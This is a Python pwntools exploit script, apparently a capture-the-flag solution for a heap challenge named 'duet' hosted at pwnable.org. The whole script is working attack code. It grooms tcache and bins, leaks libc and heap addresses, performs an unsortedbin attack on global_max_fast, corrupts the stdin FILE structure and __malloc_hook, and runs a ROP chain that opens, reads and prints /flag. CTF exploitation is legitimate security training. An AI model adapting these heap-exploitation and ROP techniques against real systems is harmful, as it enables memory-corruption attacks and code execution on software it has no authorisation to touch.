from pwn import *

e = ELF("./duet")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwnable.org", 12356)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

def alloc(idx, size, data="AAAA"):
  data = data.ljust(size, "\x00")
  
  instr = "\xe7\x90\xb4"
  if idx == 1:
    instr = "\xe7\x91\x9f"

  p.sendline("1")

  p.sendlineafter("Instrument:", instr)
  p.sendlineafter("Duration:", str(size))
  p.sendafter("Score:", data)

  p.recvuntil(":")

def free(idx):
  instr = "\xe7\x90\xb4"
  if idx == 1:
    instr = "\xe7\x91\x9f"

  p.sendline("2")
  p.sendlineafter("Instrument:", instr)

  p.recvuntil(":")

def magic(byte):
  p.sendline("5")
  p.sendlineafter(":", str(byte))

  p.recvuntil(":")

def show(idx):
  instr = "\xe7\x90\xb4"
  if idx == 1:
    instr = "\xe7\x91\x9f"

  p.sendline("3")
  p.sendlineafter("Instrument:", instr)


for i in range(7):
  alloc(0, 0x88)
  free(0)
  alloc(0, 0xe8)
  free(0)
  alloc(0, 0x198)
  free(0)
  alloc(0, 0x1d8)
  free(0)
  alloc(0, 0x2f8)
  free(0)
  alloc(0, 0x308)
  free(0)
  alloc(0, 0x398)
  free(0)

for i in range(6):
  alloc(0, 0xf8)
  free(0)

alloc(0, 0x98)
free(0)

alloc(0, 0x88)
alloc(1, 0x88)
free(0)

magic(0xf1)

c101 = p64(0x11) + p64(0) + p64(0x11)

alloc(0, 0x400, (
    (
      "A" * 0x58 + c101
    ).ljust(0x1e0 - 8, "\x00") + c101
  ).ljust(0x398, "\x00") + c101
)

free(1)

alloc(1, 0xe8, "A" * 0x88 + p64(0x1e1))

free(0)

show(1)

p.recvuntil(p64(0x1e1))

leak = u64(p.recv(8)) + 0x00007f31501db000 - 0x7f31503bfca0
print(hex(leak))

p.recvuntil("Shang")
p.recvuntil(":")


alloc(0, 0x1d8 - 0xa0, "A" * 0x58 + c101)

free(1)
alloc(1, 0xe8, "A" * 0x88 + p64(0x3a1))

free(0)

alloc(0, 0x398, ("A" * 0x58 + c101).ljust(0x5d0 - 0x490 - 8, "\x00") + 
  (p64(0xa1) + p64(leak - 0x7f262528e000 +  0x00007f2625472d30) * 2).ljust(0xa0, "\x00") + c101
)
free(1)

# force 0xf0 into smallbin
alloc(1, 0x400, p64(0x11) * 0x40 * 2)
free(1)

alloc(1, 0x98)

free(0)
alloc(0, 0x398, ("A" * 0x58).ljust(0x5d0 - 0x490 - 8, "\x00") + 
  p64(0x1a1).ljust(0x1a0, "\x00") + c101
)

free(1)
alloc(1, 0x98)
free(1)

show(0)
p.recvuntil(p64(0xa1))

hleak = u64(p.recv(8))
print(hex(hleak))

p.recvuntil("Shang")
p.recvuntil(":")

alloc(1, 0x400)
free(1)

free(0)


unsortedbin_attack_addr = leak - 0x7f3dd8d71000 + 0x7f3dd8f58600 # overwrite global_max_fast 
alloc(0, 0x398, ("A" * 8 + p64(0x101) + p64(hleak - 0x561801ebaec0 + 0x561801ebb250) + p64(unsortedbin_attack_addr - 0x10)).ljust(0x5d0 - 0x490 - 8, "\x00") + 
  p64(0xa1).ljust(0xa0, "\x00")

  # alloc(1, 0xf8) will go into here
  + (
    p64(0x101) + p64(leak +  0x00007efc1eb0fd90 - 0x7efc1e92b000) + p64(hleak + 0x55a3ca1ad080 - 0x55a3ca1acec0)
  ).ljust(0x100) + c101
)


alloc(1, 0xf8)

free(0)

alloc(0, 0x398, ("").ljust(0x5d0 - 0x490 - 8, "\x00") + 
  ("").ljust(0xa0, "\x00")
  + p64(0x301)
)

free(1)

free(0)
alloc(0, 0x398, ("").ljust(0x5d0 - 0x490 - 8, "\x00") + 
  ("").ljust(0xa0, "\x00")
  + (p64(0x301) + p64(leak + libc.symbols["__malloc_hook"] - 0x500+0x27)).ljust(0xf0) + c101
)

alloc(1, 0x2f8, p64(0x11) * (0x2f8 / 8))

free(0)
alloc(0, 0x398, ("").ljust(0x5d0 - 0x490 - 8, "\x00") + 
  ("").ljust(0xa0, "\x00")
  + p64(0x311)
)

free(1)

free(0)
alloc(0, 0x398, ("").ljust(0x5d0 - 0x490 - 8, "\x00") + 
  ("").ljust(0xa0, "\x00")
  + (p64(0x311) + p64(leak + libc.symbols["_IO_2_1_stdin_"] - 0x10)).ljust(0x100) + c101
)


alloc(1, 0x308, p64(0x11) * (0x308 / 8))

free(0)
alloc(0, 0x398, ("").ljust(0x5d0 - 0x490 - 8, "\x00") + 
  ("").ljust(0xa0, "\x00")
  + p64(0x321).ljust(0x110) + c101
)

free(1)

prdi =  0x26542 + leak
prsi = 0x0000000000026f9e + leak
prdx = 0x000000000012bda6 + leak
prax = 0x0000000000047cf8 + leak
sys = 0x00000000000cf6c5 + leak
buff = leak + libc.symbols["__malloc_hook"] + 8
alloc(1, 0x2f8, 
  ("A" 
  + p64(prdi) + p64(leak + libc.symbols["_IO_2_1_stdin_"] - 0x20)
  + p64(prsi) + p64(0)
  + p64(prax) + p64(2)
  + p64(sys)
  + p64(prdi) + p64(3)
  + p64(prsi) + p64(buff)
  + p64(prdx) + p64(0x100)
  + p64(leak + libc.symbols["read"])
  + p64(prdi) + p64(1)
  + p64(prsi) + p64(buff)
  + p64(prdx) + p64(0x100)
  + p64(leak + libc.symbols["write"])
  ).ljust(0x2f1 - 12 * 8 - 0x18, "\x00") 
  + "/flag".ljust(8, "\x00")
  + p64(leak + libc.symbols["__malloc_hook"] - 0x500 + 0x38) + p64(prdi + 1)
  + "\x11\x03"
)

free(0)
alloc(0, 0x308, (
  (
    p64(0) + p64(0) * 3 
    + p64(0x32)  # write_base
    + p64(leak + libc.symbols["_IO_2_1_stdin_"] - 0x18 - 0xa0) # write_ptr
  ).ljust(0xc0, "\x00")
  + p64(0) # mode
  + p64(0) + p64(0) + p64(leak - 0x7fb1ef6f7000 + 0x7fb1ef8dd620)
).ljust(libc.symbols["__malloc_hook"] - libc.symbols["_IO_2_1_stdin_"], "\x00") + p64(leak +  0x7f43bead7e35  - 0x7f43bea82000))
debug()

p.sendline("6")

p.interactive()
